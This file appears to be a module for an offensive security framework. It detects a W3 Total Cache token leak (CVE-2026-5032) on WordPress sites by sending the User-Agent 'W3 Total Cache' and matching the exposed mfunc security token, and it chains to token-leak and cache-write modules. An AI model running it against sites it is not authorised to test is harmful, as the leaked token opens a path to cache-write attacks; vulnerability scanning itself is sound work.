#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache <= 2.9.3 dynamic security token leak (CVE-2026-5032)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "w3-total-cache"
_VULN_HIGH = (2, 9, 3)
_MFUNC_RE = re.compile(r"<!--\s*(?:mfunc|mclude)\s+(\S+)")


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-5032 detect",
        "description": (
            "Detects W3TC_DYNAMIC_SECURITY token in HTML when User-Agent is 'W3 Total Cache'."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-5032",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-5032"],
        "modules": [
            "auxiliary/admin/http/w3_total_cache_cve_2026_5032_token_leak",
            "auxiliary/admin/http/w3_total_cache_cve_2026_18051_cache_write",
        ],
        "tags": ["web", "scanner", "wordpress", "w3-total-cache", "cve-2026-5032"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/w3_total_cache_cve_2026_5032_token_leak",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        normal = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if normal and _MFUNC_RE.search(normal.text or ""):
            return False
        bypass = self.http_request(
            method="GET",
            path=self._join("/"),
            headers={"User-Agent": "W3 Total Cache"},
            allow_redirects=True,
        )
        m = _MFUNC_RE.search(bypass.text or "") if bypass else None
        if m:
            self.set_info(
                severity="high",
                reason="W3TC dynamic fragment token leaked in page source",
                cve="CVE-2026-5032",
            )
            return True
        return False
